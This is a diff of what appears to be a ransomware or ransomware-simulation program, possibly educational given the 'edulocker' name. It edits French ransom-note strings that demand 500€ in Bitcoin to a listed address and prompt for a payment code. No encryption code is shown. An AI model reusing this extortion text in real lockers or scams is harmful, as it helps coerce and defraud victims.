@@ -9,20 +9,14 @@ RANSOM_MESSAGES = {
 		"subtitle": "Paiement requis pour récupérer vos données",
 		"main_message": """
 ⚠️ ALERTE CRITIQUE : VOTRE SYSTÈME EST VERROUILLÉ ⚠️
-Tous vos documents, photos, vidéos et autres fichiers importants ont été chiffrés 
-avec un algorithme militaire inviolable.
 Vous ne pouvez plus accéder à vos fichiers sans la clé de déchiffrement.
-Toute tentative de récupération par vous-même endommagera définitivement vos données.
 POUR RÉCUPÉRER VOS FICHIERS:
-	1. Effectuez un paiement de 500€ en Bitcoin à l'adresse suivante:
+Effectuez un paiement de 500€ en Bitcoin à l'adresse suivante:
    bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
-	2. Envoyez la preuve de paiement à: recovery@edulocker-secure.com
-	3. Vous recevrez la clé de déchiffrement sous 24h
         """,
 		"warning": "⚠️ ALERTE CRITIQUE ⚠️",
 		"description": """
 Votre système a été compromis et vos fichiers sont désormais inaccessibles.
-
 Pour obtenir la clé de déchiffrement, entrez le code de paiement ci-dessous.
         """,
 		"unlock_prompt": "Code de paiement :",
